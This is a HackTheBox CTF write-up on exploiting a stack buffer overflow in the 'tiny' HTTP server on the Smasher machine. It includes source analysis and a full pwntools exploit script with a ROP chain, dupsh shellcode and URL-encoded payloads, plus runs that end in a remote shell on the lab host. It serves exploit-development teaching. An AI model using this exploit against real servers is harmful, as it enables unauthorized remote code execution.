---
title: Buffer Overflow in HTB Smasher
url: https://0xdf.gitlab.io/2018/11/24/htb-smasher-bof.html
date: 2018-11-24T11:00:30+00:00
tags: ctf, hackthebox, htb-smasher, gdb, bof, pwntools
---

![](https://0xdfimages.gitlab.io/img/smasher-bof-cover.jpg) There was so much to write about for Smasher, it seemed that the buffer overflow in tiny deserved its own post. I’ll walk through my process, code analysis and debugging, through development of a small ROP chain, and show how I trouble shot when things didn’t work. I’ll also show off pwntools along the way.

## Program Analysis

Before I can write a exploit, I like to understand what the program is doing. For large programs, and for very experienced exploit developers, sometimes it’s easier to fuzz the program and look for crashes. That said, I use a combination of static analysis in Ida and debugging in gdb to figure out how the server worked, and where I could exploit it.

### gdb Note

I used `gdb` with the [Python Exploit Development Assistance](https://github.com/longld/peda) plugin (peda) to do this analysis. One thing I noticed was that when I was hitting `n` (`next`) or `s` (`step`), it was often jumping several assembly instructions. Turns out, when the binary is compiled with debug info (which gives access to the source along side the assembly), `n` and`s` execute to the next line of source. If you want to move one assembly instruction, use `ni` or `si`.

```

gdb-peda$ help s
Step program until it reaches a different source line.
Usage: step [N]
Argument N means step N times (or till program stops for another reason).
gdb-peda$ help si
Step one instruction exactly.
Usage: stepi [N]
Argument N means step N times (or till program stops for another reason).

```

### Code Overview

The flow of `tiny` starts in `main()`, which handles listening, and accepting connections. On a connection, a new process if forked, and the child process calls `process()` and is passed the socket.

`process()` creates an `http_request` struct called `req`. The `http_request` struct is defined in `tiny.c` as having a filename, an offset, and an end:

```

typedef struct {
    char filename[512];
    off_t offset;              /* for support Range */
    size_t end;
} http_request;

```

![](https://0xdfimages.gitlab.io/img/smasher-pointers.jpeg)A pointer to `req` and the socket descriptor are passed to a function called `parse_request`.

`parse_request` reads from the socket, and populates `req`. `req->offset` and `req->end` are set inside `parse_request`, and `req->filename` is passed by reference to a function called `url_decode`, where the filename is copied into the `http_request` object.

### Vulnerability

The vulnerability comes because `parse_request` will handle up to 1024 bytes of filename, and the `url_decode` function will, without checking bounds, copy that much, despite the fact that the `http_request` struct only allows for 512 bytes of filename.

So, while in `url_decode`, the stack looks like this:

![1530025375925](https://0xdfimages.gitlab.io/img/1530025375925.png)

So that means if I can write a filename longer than 0x2c8 - 0x90 = 0x238 = 568 bytes, when url\_decode() writes to `filename`, it will overwrite `rip`, giving me control over the program.

## Exploitation

### Strategy

To gain execution, I need to be able to get the `RIP` register pointing to shellcode that I give it. In the early days of exploitation, that could be as simple as writing shellcode onto the stack (in my input) and then overwriting `rip` with that address. However, with ASLR (which is on enabled in this case), guessing that address becomes infeasible. So, I’ll use return oriented programming, or ROP. ROP is basically using the last instruction (or last few instructions) from various functions in the binary to achieve steps towards what I want to accomplish.

I am going to use the `read` function to read from the open socket, and save it to the BSS segment. I’ll need the address of `read` and `BSS`, and rop gadgets that will get the right arguments in place for those calls. Once I read shellcode into BSS, I’ll call it.
*July 2023 Note: Getting this exact script to work in modern Python will take some work. If you choose to go with Python2, you may need to [freeze unicorn](https://github.com/Gallopsled/pwntools/issues/1538) at version 1.0.2rc6. to make `pwntools` work as expected. Thanks to InvertedClimbing for the tip.*

### Initial Attempt

#### Skeleton

I’ll build an exploit script with `pwntools`. Start with a skeleton:

```

#/usr/bin/env python

from pwn import *

# Set up context
elf = context.binary = ELF('./tiny', checksec=False)
HOST, PORT = "127.0.0.1", 1111

# Build Payload
junk = "A" * 568  # junk to get to ret addr
payload =  ""
# rop will go here

# Request
req = r'GET {}'.format(payload)

# Send request
r.sendline(req)
r.sendline('')

r.interactive()

```

#### Add Addresses

Add to the template code to get the BSS address and the address of read:

```

# Get addresses
BSS = elf.get_section_by_name(".bss")["sh_addr"]
log.info("BSS address: {}".format(BSS))
read = elf.plt.read
log.info("plt read address: {}".format(read))

```

#### Gadgets

Now I’ll need some gadgets. In `gdb` with `peda` loaded, I ran `dumprop`, which writes a bunch of gadgets to a file, `tiny-rop.txt`. To call `read`, I’ll need to pass the socket descriptor in `rsi`, and the address to write to in `rdi`. So I need gadgets to pop into those registers. I’ll find these two:

```

0x4011dd: pop rdi; ret           <-- useful to pass parameters to read
0x4011db: pop rsi; pop r15; ret  <-- useful to pass parameters to read, ignoring r15

```

So, this all adds up to the following payload:

```

junk =  "A" * 568      # junk
payload = ""
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(4)         # socket descriptor
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(BSS)       # BSS, to go to rsi
payload += p64(BSS)       # junk for r15
payload += p64(read)      # read
payload += p64(BSS)       # return to shellcode

```

I’ll walk through that in detail:
- `junk` will be the right length so that when the program goes to return, the top of the stack will be the start of `payload`. Therefore, execution will return to the `pop rdi; ret` gadget, and 4 will sit on top of the stack.
- `pop rdi` will take the 4 off the top of the stack and store it in `rdi`. This leaves the second gadget on top of the stack.
- `ret` will move execution to the second gadget, leaving the address of bss on top of the stack.
- The second gadget will pop twice, into `rsi` and `r15`. I don’t care about `r15`, but I needed the bss address in `rsi`. Now, the address of `read` sits on top of the stack.
- `ret` will push execution to the read call, leaving the bss address on top of the stack. Because I now have the socket descriptor in `rdi`, and the bss address in `rsi`, it will read from the socket into bss.
- If I had called `read` as a function, that would have pushed a new return address onto the stack. But since I just moved RIP there, when read returns, it will pop the next word off the stack for a return address, which is the bss address, where I just wrote my shellcode.

#### Dup Shellcode

Next, I’ll use `pwntools` to generate shellcode to that will reuse the socket file descriptor for a `sh` that I can interact with. To use this function, I need the descriptor for the socket. I’ve noticed that when I run `tiny` locally, every time I make a request to it, it prints out the fd, and it’s consistently 4:

```

root@kali# ./tiny 1111
listen on port 1111, fd is 3
accept request, fd is 4, pid is 2702
127.0.0.1:60506 200 - .

```

So I’ll add the following to my code, which will generate shellcode to run a shell over my current connection and send it over the socket:

```

r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))

```

Now the exploit code looks like this:

```

#/usr/bin/env python

from pwn import *

# Set up context
elf = context.binary = ELF('./tiny', checksec=False)
HOST, PORt = "127.0.0.1", 1111

# Get addresses
BSS = elf.get_section_by_name(".bss")["sh_addr"]
log.info("BSS address: {}".format(BSS))
read = elf.plt.read
log.info("plt read address: {}".format(read))

# Build Payload
junk =  "A" * 568         # junk
payload = ""
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(4)         # socket descriptor
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(BSS)       # BSS, to go to rsi
payload += p64(BSS)       # junk for r15
payload += p64(read)      # read
payload += p64(BSS)       # return to shellcode

# Request
req = r'GET {}'.format(junk + payload)

# Send request
r.sendline(req)
r.sendline('')
r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))
r.interactive()

```

#### Run It (and Fail)

Ready to get a shell, I’ll run it:

```

root@kali# python tiny_exploit.py
[*] BSS address: 6304352
[*] plt read address: 4197616
[*] payload: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141dd114000000000000400000000000000db1140000000000060326000000000006032600000000000f00c4000000000006032600000000000
[+] Opening connection to 127.0.0.1 on port 1111: Done
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ id
[*] Closed connection to 127.0.0.1 port 1111
[*] Got EOF while sending in interactive
root@kali#

```

### Second Attempt

#### Why Did That Fail?

Back in the source, if I trace what happens to my string, `parse_request` looks like this:

```

270 void parse_request(int fd, http_request *req){
271     rio_t rio;
272     char buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
273     req->offset = 0;
274     req->end = 0;              /* default */
275
276     rio_readinitb(&rio, fd);
277     rio_readlineb(&rio, buf, MAXLINE);
278     sscanf(buf, "%s %s", method, uri); /* version is not cared */
279     /* read all */
280     while(buf[0] != '\n' && buf[1] != '\n') { /* \n || \r\n */
281         rio_readlineb(&rio, buf, MAXLINE);
282         if(buf[0] == 'R' && buf[1] == 'a' && buf[2] == 'n'){
283             sscanf(buf, "Range: bytes=%lu-%lu", &req->offset, &req->end);
284             // Range: [start, end]
285             if( req->end != 0) req->end ++;
286         }
287     }
288     char* filename = uri;
289     if(uri[0] == '/'){
290         filename = uri + 1;
291         int length = strlen(filename);
292         if (length == 0){
293             filename = ".";
294         } else {
295             for (int i = 0; i < length; ++ i) {
296                 if (filename[i] == '?') {
297                     filename[i] = '\0';
298                     break;
299                 }
300             }
301         }
302     }
303     url_decode(filename, req->filename, MAXLINE);
304 }

```

The first 1024 bytes of input is read into `buf`, and then `sscanf` is used to pull the first two strings out of it, in a normal case, something like “GET” and “/”. But if I look at the payload I sent (with the initial “A”s truncated), it looks like:

```

...41414141dd114000000000000400000000000000db1140000000000060326000000000006032600000000000f00c4000000000006032600000000000

```

As soon as `sscanf` gets to that first null (00) byte, it stops.

#### Success

Fortunately, the last thing the code does before writing bytes into the structure I can overflow is to url decode them. So that’s how I can get these bytes to the right place. By encoding the bytes, they will be strings, and then decoded into binary form as I need it.

I’ll import `quote` from `urllib` in python.

Now the code looks like this:

```

#/usr/bin/env python

from pwn import *
from urllib import quote as urlencode

# url encode
def url_encode(s):
    return ''.join(["%%%02x" % ord(x) for x in s])

# Set up context
elf = context.binary = ELF('./tiny', checksec=False)
#HOST, PORT = "127.0.0.1", 1111
HOST, PORT = "10.10.10.89", 1111

# Get addresses
BSS = elf.get_section_by_name(".bss")["sh_addr"]
log.info("BSS address: {:02x}".format(BSS))
read = elf.plt.read
log.info("plt read address: {:02x}".format(read))

# Build Payload
junk = "A" * 568                  # junk
payload = ''
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(4)         # socket descriptor
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(BSS)       # BSS, to go to rsi
payload += p64(BSS)       # junk for r15
payload += p64(read)      # read
payload += p64(BSS)       # return to shellcode
log.info('payload: {}'.format(urlencode(junk + payload)))

req = r'GET {}'.format(urlencode(junk + payload))

# Send request
r = remote(HOST, PORT)
r.sendline(req)
r.sendline('')
r.recvuntil('File not found')
r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))
r.interactive()

```

And, it gives me a shell:

```

root@kali# python tiny_exploit.py
[*] BSS address: 603260
[*] plt read address: 400cf0
[*] payload: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%dd%11%40%00%00%00%00%00%04%00%00%00%00%00%00%00%db%11%40%00%00%00%00%00%60%32%60%00%00%00%00%00%60%32%60%00%00%00%00%00%f0%0c%40%00%00%00%00%00%60%32%60%00%00%00%00%00
[+] Opening connection to 10.10.10.89 on port 1111: Done
[*] Switching to interactive mode
$ id
uid=1000(www) gid=1000(www) groups=1000(www)

```

[« HTB: Smasher](/2018/11/24/htb-smasher.html)